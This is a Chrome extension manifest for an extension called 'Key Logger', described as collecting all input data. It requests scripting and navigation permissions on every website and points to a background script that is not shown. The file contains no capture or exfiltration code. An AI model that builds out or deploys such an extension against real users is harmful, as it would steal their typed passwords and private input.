{
  "manifest_version": 3,
  "name": "Key Logger",
  "description": "collect all input data",
  "version": "1.0",
  "action": {
    "default_title": "Click to show an alert"
  },
  "permissions": ["activeTab", "scripting", "webNavigation"],
  "host_permissions": ["http://*/*", "https://*/*"],
  "background": {
    "service_worker": "background.js"
  }
}
